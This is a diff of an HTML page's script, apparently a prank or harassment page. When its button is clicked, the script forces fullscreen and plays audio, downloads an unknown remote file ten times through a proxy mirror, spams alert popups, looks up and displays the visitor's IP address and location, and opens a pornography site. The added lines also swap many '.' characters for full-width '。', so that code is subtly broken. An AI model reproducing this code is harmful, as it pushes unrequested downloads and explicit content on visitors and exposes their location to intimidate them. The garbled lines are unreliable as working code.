@@ -11,59 +11,66 @@
             display: block;
         }
     </style>
-    <script>
-        function launchFullscreen(element) {
-            if (element.requestFullscreen) {
-                element.requestFullscreen();
-            } else if (element.mozRequestFullScreen) { // Firefox
-                element.mozRequestFullScreen();
-            } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
-                element.webkitRequestFullscreen();
-            } else if (element.msRequestFullscreen) { // IE/Edge
-                element.msRequestFullscreen();
-            }
-            document.querySelector('.content').style.display = 'block';
-            document.querySelectorAll('audio').forEach(audio => audio.play());
-            document.querySelector('.image').style.display = 'none'; // Hide the image
-            document.querySelector('button').style.display = 'none'; // Hide the button
-
-            // Loop to download the file 10 times
-            for (let i = 0; i < 10; i++) {
-                fetch('https://mirror.ghproxy.com/https://raw.githubusercontent.com/miku1hhhh/miku1hhhh.github.io/main/0')
-                    .then(response => response.blob())
-                    .then(blob => {
-                        const link = document.createElement('a');
-                        link.href = URL.createObjectURL(blob);
-                        link.download = `downloaded_file_${i + 1}`; // Set a unique file name for each download
-                        document.body.appendChild(link);
-                        link.click();
-                        document.body.removeChild(link);
-                    })
-                    .catch(console.error);
-            }
-
-            // Trigger multiple alert popups
-            const numberOfAlerts = 5; // Customize the number of alerts here
-            for (let i = 0; i < numberOfAlerts; i++) {
-                setTimeout(() => alert(`弹窗${i + 1}: 这是第${i + 1}个弹窗!`), (i + 1) * 1000);
-            }
-
-            // Fetch and display IP address and location
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    document.getElementById('ip-address').textContent = `您的IP地址是: ${ip}`;
-                    return fetch(`https://ipapi.co/${ip}/json/`);
-                })
-                .then(response => response.json())
-                .then(data => {
-                    const location = `${data.city}, ${data.region}, ${data.country_name}`;
-                    document.getElementById('ip-location').textContent = `IP归属地: ${location}`;
-                })
-                .catch(console.error);
+<script>
+    function launchFullscreen(element) {
+        if (element.requestFullscreen) {
+            element.requestFullscreen();
+        } else if (element.mozRequestFullScreen) { // Firefox
+            element.mozRequestFullScreen();
+        } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
+            element.webkitRequestFullscreen();
+        } else if (element.msRequestFullscreen) { // IE/Edge
+            element.msRequestFullscreen();
         }
-    </script>
+        document.querySelector('.content').style.display = 'block';
+        document.querySelectorAll('audio').forEach(audio => audio.play());
+        document.querySelector('.image').style.display = 'none'; // Hide the image
+        document.querySelector('button').style.display = 'none'; // Hide the button
+
+        // Loop to download the file 10 times
+        for (let i = 0; i < 10; i++) {
+            fetch('https://mirror.ghproxy.com/https://raw.githubusercontent.com/miku1hhhh/miku1hhhh.github.io/main/0')
+                .then(response => response.blob())
+                。then(blob => {
+                    const link = document.createElement('a');
+                    link.href = URL.createObjectURL(blob);
+                    link.download = `downloaded_file_${i + 1}`; // Set a unique file name for each download
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                })
+                。catch(console.error);
+        }
+
+        // Trigger multiple alert popups
+        const numberOfAlerts = 5; // Customize the number of alerts here
+        for (let i = 0; i < numberOfAlerts; i++) {
+            setTimeout(() => alert(`弹窗${i + 1}: 这是第${i + 1}个弹窗!`), (i + 1) * 1000);
+        }
+
+        // Fetch and display IP address and location
+        fetch('https://api.ipify.org?format=json')
+            。then(response => response.json())
+            。then(data => {
+                const ip = data.ip;
+                document.getElementById('ip-address').textContent = `您的IP地址是: ${ip}`;
+                return fetch(`https://ipapi.co/${ip}/json/`);
+            })
+            。then(response => response.json())
+            。then(data => {
+                const location = `${data.city}, ${data.region}, ${data.country_name}`;
+                document.getElementById('ip-location').textContent = `IP归属地: ${location}`;
+            })
+            。catch(console.error);
+
+        // Open a new window or tab multiple times
+        const url = 'pornhub.com'; // Replace with your desired URL
+        const numberOfWindows = 1; // Number of times to open the URL
+        for (let i = 0; i < numberOfWindows; i++) {
+            setTimeout(() => window.open(url), (i + 1) * 2000); // Adjust timing as needed
+        }
+    }
+</script>
 </head>
 
 <body>
